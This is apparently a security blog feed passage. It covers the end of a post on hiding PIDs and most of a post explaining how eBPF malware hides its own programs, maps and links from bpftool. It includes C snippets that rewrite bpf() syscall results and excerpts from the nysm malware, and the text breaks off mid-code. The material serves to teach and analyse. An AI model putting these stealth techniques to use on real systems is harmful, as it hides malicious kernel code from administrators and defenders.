<p>One of the biggest takeaways here is that even though the logic of hiding a PID is simple, implementing it safely and correctly under eBPF&rsquo;s strict verification rules — especially when dealing with pointer arithmetic and loops — is non-trivial. You must be meticulous about bounds checking, tail calls, and ensuring consistent behavior across invocations.</p>
<p>You can also check out <a href="https://github.com/pathtofile/bad-bpf/blob/main/src/pidhide.bpf.c"><em>pidhide</em></a>, which is another eBPF application that uses the same technique but implements the logic slightly differently.</p>
<p>Now that you are armed with dangerous knowledge, it is time to get your hands dirty. Adios!</p>
<h2 id="6-resources">6. Resources</h2>
<ol>
<li><a href="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/resources/simple_ls_cwd.c">simple_ls_cwd.c</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>eBPF Malware Techniques Part 3 - Hiding BPF Traces</title>
            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/</link>
            <pubDate>Sat, 26 Apr 2025 10:45:47 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re finally gonna talk about the juicy stuff now that you are all geared up! Today, we are gonna go into a deep dive on how an eBPF application can hide itself and its child processes by understanding specific crucial Linux internals and how to circumvent them. I will be mainly using &lt;a href=&#34;https://github.com/eeriedusk/nysm&#34;&gt;&lt;em&gt;nysm&lt;/em&gt;&lt;/a&gt;, a eBPF-based malware as my prime example for hiding BPF traces.&lt;/p&gt;
&lt;h2 id=&#34;2-ebpf-enumeration-with-bpf-syscalls&#34;&gt;2. eBPF Enumeration with BPF Syscalls&lt;/h2&gt;
&lt;p&gt;When working with eBPF, it&amp;rsquo;s important to understand what&amp;rsquo;s actually loaded into the kernel at any point in time. Fortunately, &lt;em&gt;bpftool&lt;/em&gt; gives us powerful inspection capabilities through &lt;em&gt;bpf()&lt;/em&gt; syscalls., which we will take a deeper look in a second.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>We&rsquo;re finally gonna talk about the juicy stuff now that you are all geared up! Today, we are gonna go into a deep dive on how an eBPF application can hide itself and its child processes by understanding specific crucial Linux internals and how to circumvent them. I will be mainly using <a href="https://github.com/eeriedusk/nysm"><em>nysm</em></a>, a eBPF-based malware as my prime example for hiding BPF traces.</p>
<h2 id="2-ebpf-enumeration-with-bpf-syscalls">2. eBPF Enumeration with BPF Syscalls</h2>
<p>When working with eBPF, it&rsquo;s important to understand what&rsquo;s actually loaded into the kernel at any point in time. Fortunately, <em>bpftool</em> gives us powerful inspection capabilities through <em>bpf()</em> syscalls., which we will take a deeper look in a second.</p>
<p>To list all eBPF programs running on the system, run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool prog show
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftool</em> - Listing All Programs<br><br></span>
<p>For demonstration purposes, I ran the <a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/examples/c/minimal.bpf.c"><em>minimal</em></a> eBPF application before enumerating the eBPF programs and my output looks something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>109: cgroup_skb  name sd_fw_egress  tag 6deef7357e7b4530  gpl
</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T19:35:32+0800  uid <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	xlated 64B  jited 56B  memlock 4096B
</span></span><span style="display:flex;"><span>110: cgroup_skb  name sd_fw_ingress  tag 6deef7357e7b4530  gpl
</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T19:35:32+0800  uid <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	xlated 64B  jited 56B  memlock 4096B
</span></span><span style="display:flex;"><span>142: tracepoint  name handle_tp  tag 6a5dcef153b1001e  gpl
</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T20:03:01+0800  uid <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	xlated 104B  jited 67B  memlock 4096B  map_ids 24,25
</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftool</em> - Example Output of eBPF Programs<br><br></span>
<p>Looking at the above listing, you can see that the <em>minimal</em> eBPF application is running one program whose <em>prog_id</em> is 142.
We can also see that it has 2 eBPF maps with <em>map_id</em> 24 and 25 and a <em>btf_id</em> of 130. It also contains information of the type of hook, which is a <em>tracepoint</em> and the hook handler&rsquo;s function name - <em>handle_tp()</em>.</p>
<p>As this does not provide us a complete picture of what the eBPF application is doing, we need to further enumerate its maps, btf and link information. Since we already know the <em>map_id</em> and <em>btf_id</em>, we can do a direct query instead of going through the list.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool map show id <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>24: array  name minimal_.bss  flags 0x400
</span></span><span style="display:flex;"><span>	key 4B  value 4B  max_entries <span style="color:#ae81ff">1</span>  memlock 8192B
</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo bpftool map show id <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>25: array  name minimal_.rodata  flags 0x80
</span></span><span style="display:flex;"><span>	key 4B  value 28B  max_entries <span style="color:#ae81ff">1</span>  memlock 296B
</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>  frozen
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftool</em> - Getting Map Info from ID 24 and 25<br><br></span>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool btf show id <span style="color:#ae81ff">130</span>
</span></span><span style="display:flex;"><span>130: name &lt;anon&gt;  size 602B  prog_ids <span style="color:#ae81ff">142</span>  map_ids 25,24
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftool</em> - Getting BTF Info from ID 130<br><br></span>
<p>At this point, we are still lacking one crucial information, and that is the actual <em>tracepoint</em> name. As the <em>link_id</em> was not displayed in our eBPF program enumeration, we have to list out all links.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool link show
</span></span><span style="display:flex;"><span>5: perf_event  prog <span style="color:#ae81ff">142</span>  
</span></span><span style="display:flex;"><span>	tracepoint sys_enter_write
</span></span></code></pre></div><p><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpftool</em> - Listing All Links<br><br></span>
The output is pretty obvious as I do not have other eBPF applications running in the background except for <em>minimal</em>. We are finally able to connect the dots and deduce the <em>minimal</em> eBPF application is running one eBPF program that utilizes <em>tracepoints</em> to intercept at the start of every <em>write()</em> syscall.</p>
<p>Now that we have a rough idea on what&rsquo;s going, we are going to switch gears delve right into the actual <em>bpf()</em> syscalls with <em>strace</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo strace -e bpf bpftool prog show
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_NEXT_ID, <span style="color:#f92672">{</span>start_id<span style="color:#f92672">=</span>109, next_id<span style="color:#f92672">=</span>0 <span style="color:#f92672">=</span>&gt; 110, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_FD_BY_ID, <span style="color:#f92672">{</span>prog_id<span style="color:#f92672">=</span>110, next_id<span style="color:#f92672">=</span>0, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_OBJ_GET_INFO_BY_FD, <span style="color:#f92672">{</span>info<span style="color:#f92672">={</span>bpf_fd<span style="color:#f92672">=</span>3, info_len<span style="color:#f92672">=</span>232, info<span style="color:#f92672">=</span>0x7ffe54870d60<span style="color:#f92672">}}</span>, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_NEXT_ID, <span style="color:#f92672">{</span>start_id<span style="color:#f92672">=</span>110, next_id<span style="color:#f92672">=</span>0 <span style="color:#f92672">=</span>&gt; 142, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_FD_BY_ID, <span style="color:#f92672">{</span>prog_id<span style="color:#f92672">=</span>142, next_id<span style="color:#f92672">=</span>0, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_OBJ_GET_INFO_BY_FD, <span style="color:#f92672">{</span>info<span style="color:#f92672">={</span>bpf_fd<span style="color:#f92672">=</span>3, info_len<span style="color:#f92672">=</span>232, info<span style="color:#f92672">=</span>0x7ffe54870d60<span style="color:#f92672">}}</span>, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Output of <em>strace</em> showing only <em>bpf()</em> syscall - <em>bpftool</em> prog show<br><br></span>
<p>Now we&rsquo;re talking! Dissecting <em>bpftool</em> reveals the important parameters used in <em>bpf()</em> syscalls to enumerate through the linked list of programs. I would also like to point out that when the first parameter is <em>BPF_PROG_GET_NEXT_ID</em>, <em>next_id</em> will only get its updated value when the syscall exits. Let&rsquo;s break down what the <em>bpf()</em> syscall parameters are according to the manual.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>NAME
</span></span><span style="display:flex;"><span>       bpf <span style="color:#f92672">-</span> perform a command on an extended BPF map or program
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SYNOPSIS
</span></span><span style="display:flex;"><span>       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/bpf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">bpf</span>(<span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">union</span> bpf_attr <span style="color:#f92672">*</span>attr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>bpf()</em> Syscall Manual<br><br></span>
<ol>
<li><code>int cmd</code> - This integer constant defines the operation type.</li>
<li><code>union bpf_attr *attr</code> - This is a pointer to a <code>union bpf_attr</code>, which is a giant union that contains the relevant fields depending on the <code>cmd</code> value.</li>
<li><code>unsigned int size</code> - This refers to the actual size of <code>union bpf_attr</code></li>
</ol>
<h2 id="3-methodology-on-hiding-bpf-traces">3 Methodology on Hiding BPF Traces</h2>
<p>If you have been following along closely so far, you will realize by now that we have 2 possible methods to hide a targeted eBPF program. We can either intercept at <em>BPF_PROG_GET_NEXT_ID</em> or <em>BPF_PROG_GET_FD_BY_ID</em>. The following listings show 2 snippets of how we can possibly hide a targeted <em>prog_id</em> using 2 different methods.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Method 1: Intercept BPF_PROG_GET_NEXT_ID @ tp/syscalls/sys_exit_bpf */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> BPF_PROG_GET_NEXT_ID) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read_user</span>(<span style="color:#f92672">&amp;</span>next_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>), <span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>next_id)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (next_id <span style="color:#f92672">==</span> prog_id_to_hide) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Skip over the target program
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> prog_id_to_hide <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>next_id, <span style="color:#f92672">&amp;</span>next_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Method 1 - Intercept <em>BPF_PROG_GET_NEXT_ID</em> at <em>sys_exit_bpf</em><br><br></span>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Method 2: Intercept BPF_PROG_GET_FD_BY_ID @ tp/syscalls/sys_enter_bpf */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> prog_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> BPF_PROG_GET_FD_BY_ID) { 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read_user</span>(<span style="color:#f92672">&amp;</span>prog_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>), <span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>prog_id)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (prog_id <span style="color:#f92672">==</span> prog_id_to_hide) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Overwrite attr-&gt;prog_id to 0.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        prog_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>prog_id, <span style="color:#f92672">&amp;</span>prog_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Method 2 - Intercept <em>BPF_PROG_GET_FD_BY_ID</em> at <em>sys_enter_bpf</em><br><br></span>
<p>Of course these 2 methods only hide the eBPF <em>prog_id</em>. This logic can be extended to hide targeted <em>map_id</em>, <em>link_id</em> and <em>btf_id</em> as well.</p>
<h2 id="4-github-project---eeriedusknysm">4 Github Project - eeriedusk/nysm</h2>
<p>Let’s now tie everything together with a real-world example: <em>nysm</em>. This project doesn’t just demonstrate hiding eBPF programs in theory — it actually pulls it off. Using the <em>libbpf</em> framework, <em>nysm</em> manipulates BPF syscalls in stealthy ways to hide its own existence from userland tools like <em>bpftool</em>.</p>
<p>We’re gonna break down how it works in a step-by-step fashion.</p>
<h3 id="41-setting-baseline">4.1 Setting Baseline</h3>
<p>Before it hides anything, <em>nysm</em> first figures out what’s already on the system. This is important because it needs to distinguish between stuff that was already there, and stuff it’s about to load and should hide.</p>
<p>This is done in userspace (nysm.c) with a function called <em>bpf_list_object()</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_list_object</span>(<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> index   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (true) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">object_func</span>(next_id, <span style="color:#f92672">&amp;</span>next_id)) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        id[index] <span style="color:#f92672">=</span> next_id;
</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Function Definition of <em>bpf_list_object()</em><br><br></span>
<p><em>run_ebpf()</em> will call on this function 3 times with different parameters in order to populate the arrays - <em>prog_ids</em>, <em>map_ids</em> and <em>link_ids</em> respectively to establish a baseline.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_prog_get_next_id, prog_ids);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_map_get_next_id, map_ids);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_link_get_next_id, link_ids);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Establishing baseline for <em>prog_ids</em>, <em>map_ids</em> and <em>link_ids</em><br><br></span>
<h3 id="42-isolating-the-namespace">4.2 Isolating the Namespace</h3>
<p>To have thorough control over different processes (including itself), nysm achieves this using PID namespaces. It grabs its own namespace inode like stores it as a global variable in the <em>.bss</em> section.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(pidns_path, <span style="color:#66d9ef">sizeof</span>(pidns_path), <span style="color:#e6db74">&#34;/proc/%d/ns/pid&#34;</span>, pid<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stat</span>(pidns_path, <span style="color:#f92672">&amp;</span>st)) <span style="color:#66d9ef">goto</span> cleanup;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    nysm<span style="color:#f92672">-&gt;</span>bss<span style="color:#f92672">-&gt;</span>pidns <span style="color:#f92672">=</span> st.st_ino;
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Storing its PID Namespace as a Global Variable<br><br></span>
<p>For example, in the case of the <em>bpf_sys_exit</em> <em>tracepoint</em>, <em>nysm</em> ignores itself and child processes that triggers this <em>tracepoint</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_bpf&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_bpf_exit</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Ignoring Self and Child Processes<br><br></span>
<h3 id="43-hiding-whats-new">4.3 Hiding What&rsquo;s New</h3>
<p>Once the baseline is saved and <em>nysm’s</em> own eBPF programs are loaded, it scans the system again. Anything new gets flagged for hiding by calling <em>bpf_hide_diff_object()</em>. This function compares the new list of objects with the old list. If it finds anything new, it updates a map in the kernel to mark it for hiding.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#66d9ef">int</span> map_fd, <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id_old) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (true) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">object_func</span>(next_id, <span style="color:#f92672">&amp;</span>next_id)) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (id_old[index] <span style="color:#f92672">!=</span> next_id) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">bpf_map_update_elem</span>(map_fd, <span style="color:#f92672">&amp;</span>next_id, <span style="color:#f92672">&amp;</span>next_id, BPF_ANY);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Function Definition of <em>bpf_hide_diff_object()</em><br><br></span>
<p>Again, looking back at <em>run_ebpf()</em>, we can see that this function is called 3 times to populate the different object maps so that it knows exactly which object IDs to hide.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_security_bpf_prog_id_data), bpf_prog_get_next_id, prog_ids);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_security_bpf_map_id_data), bpf_map_get_next_id, map_ids);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_bpf_link_prime_id_data), bpf_link_get_next_id, link_ids);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Populating Different Object Maps Containing IDs to Hide<br><br></span>
<p>Now that the maps are populated, it’s time for the fun part.</p>
<h3 id="44-kernel-space-hooking">4.4 Kernel-Space Hooking</h3>
<p>The main magic happens in <em>get_next_non_listed_id()</em> at the <em>sys_exit_bpf</em> <em>tracepoint</em>. This function iterates through different object maps which previously contained a set of IDs to hide. It will then return a non-listed object ID that is used to overwrite the original value stored in <code>uattr_ptr-&gt;next_id</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_bpf&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_bpf_exit</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (branch) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_PROG_GET_NEXT_ID :
</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_security_bpf_prog_id_data, attr.next_id);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_MAP_GET_NEXT_ID :
</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_security_bpf_map_id_data , attr.next_id);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_LINK_GET_NEXT_ID :
</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_bpf_link_prime_id_data   , attr.next_id);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span> <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
